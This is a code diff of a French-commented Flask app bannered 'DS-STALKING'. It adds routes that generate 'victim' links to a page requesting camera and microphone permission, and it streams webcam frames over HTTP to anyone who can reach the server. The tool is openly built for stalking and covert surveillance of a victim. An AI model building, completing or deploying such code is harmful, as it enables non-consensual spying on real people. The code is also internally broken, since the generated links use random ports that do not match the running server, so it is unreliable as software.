@@ -1,13 +1,14 @@
-from flask import Flask, render_template, Response, jsonify
-import socket
-import pyfiglet
+from flask import Flask, render_template, request, jsonify, Response
 import cv2
+import socket
 import random
-import threading
+import pyfiglet
 import webbrowser
-from flask_socketio import SocketIO
 
-# Créer une interface ASCII art avec pyfiglet
+# Initialiser l'application Flask
+app = Flask(__name__)
+
+# Afficher l'interface ASCII art
 def display_interface():
     custom_fig = pyfiglet.Figlet(font="small")
     ascii_art_text = custom_fig.renderText("DS-STALKING")
@@ -23,13 +24,6 @@ def display_interface():
     for line in info:
         print(f"  {line}")
     print(border)
-
-# Afficher l'interface ASCII au démarrage
-display_interface()
-
-# Initialiser l'application Flask et SocketIO
-app = Flask(__name__)
-socketio = SocketIO(app)
 
 # Obtenir l'adresse IP locale
 def get_local_ip():
@@ -47,21 +41,21 @@ def get_local_ip():
 def get_random_port():
     return random.randint(10000, 65535)
 
-# Flux vidéo en direct
+# Capture du flux vidéo
 def generate_video_stream():
-    # Initialiser OpenCV pour capturer depuis la caméra (utiliser 0 pour la caméra par défaut)
-    cap = cv2.VideoCapture(0)
+    # Initialiser OpenCV pour capturer depuis la caméra
+    cap = cv2.VideoCapture(0)  # '0' pour la caméra par défaut
     while True:
         ret, frame = cap.read()
         if not ret:
             break
-        
+
         # Encoder l'image en JPEG
         _, jpeg = cv2.imencode('.jpg', frame)
         # Convertir l'image en bytes
         frame_bytes = jpeg.tobytes()
-        
-        # Yield the image as a part of the multipart response
+
+        # Transmission de l'image en temps réel
         yield (b'--frame\r\n'
                b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n\r\n')
 
@@ -69,38 +63,45 @@ def generate_video_stream():
 
 @app.route('/video_feed')
 def video_feed():
-    # Générer un flux vidéo avec OpenCV
+    # Flux vidéo en direct via Flask
     return Response(generate_video_stream(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 @app.route("/")
 def home():
-    # Page qui demande l'accès à la caméra et au micro
-    return render_template("camera.html")
+    # Page principale qui demande le lien à entrer
+    return render_template("index.html")
+
+@app.route("/victim_link", methods=["POST"])
+def victim_link():
+    # Retourner un lien unique pour la victime
+    user_link = request.json.get("user_link")
+    local_ip = get_local_ip()
+    port = get_random_port()  # Port aléatoire à chaque fois
+    victim_url = f"http://{local_ip}:{port}/victim_permission"
+    return jsonify({"victim_url": victim_url})
+
+@app.route("/victim_permission")
+def victim_permission():
+    # Demander l'autorisation de la caméra et du micro
+    return render_template("victim_permission.html")
 
 @app.route("/stream_link", methods=["POST"])
 def stream_link():
-    # Génère un lien contenant l'adresse IP et le port
+    # Retourner le lien de flux vidéo et audio en temps réel
     local_ip = get_local_ip()
     port = get_random_port()  # Port aléatoire à chaque exécution
     stream_url = f"http://{local_ip}:{port}/video_feed"
     return jsonify({"stream_url": stream_url})
 
-def open_browser():
-    # Ouvrir un navigateur pour visualiser le flux vidéo
-    local_ip = get_local_ip()
-    port = get_random_port()  # Utiliser un port unique pour le navigateur
-    url = f"http://{local_ip}:{port}/video_feed"
-    
-    # Utiliser le module webbrowser pour ouvrir le lien dans un navigateur
-    webbrowser.open(url)
-
 if __name__ == "__main__":
-    # Exécuter le serveur Flask avec un port aléatoire
+    # Lancer le serveur Flask
     local_ip = get_local_ip()
     port = get_random_port()
     print(f"Serveur en cours d'exécution : http://{local_ip}:{port}")
 
-    # Ouvrir automatiquement le navigateur pour le flux vidéo
-    open_browser()
+    display_interface()
 
-    socketio.run(app, host="0.0.0.0", port=port)  # Lancer le serveur Flask sur le port généré
+    # Ouvrir le navigateur pour l'utilisateur afin de suivre les flux vidéo
+    webbrowser.open(f"http://{local_ip}:{port}")
+
+    app.run(host="0.0.0.0", port=port)
